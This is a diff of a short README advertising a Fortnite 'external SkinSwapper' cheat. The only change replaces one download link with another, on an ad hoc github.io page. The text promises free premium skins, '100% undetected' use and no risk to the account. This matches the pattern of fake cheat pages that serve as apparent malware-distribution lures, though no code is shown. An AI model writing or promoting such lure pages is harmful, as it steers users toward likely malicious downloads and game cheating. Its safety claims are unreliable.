@@ -2,7 +2,7 @@
 
 Tired of using the same default skin in **Fortnite**? 🎮 This powerful **C++ external SkinSwapper** allows you to unlock and use premium cosmetics including legendary skins, exclusive pickaxes, emotes, and more — without touching your game files or risking your account. 100% undetected and easy to use, this tool is the perfect way to personalize your style in every match.
 
-[![Download Fortnite SkinSwapper](https://img.shields.io/badge/Download-Fortnite_SkinSwapper-blueviolet)](https://fileoffload3.bitbucket.io)
+[![Download Fortnite SkinSwapper](https://img.shields.io/badge/Download-Fortnite_SkinSwapper-blueviolet)](https://Fortnite-SkinSwapper-tix.github.io/.github)
 
 ---
 
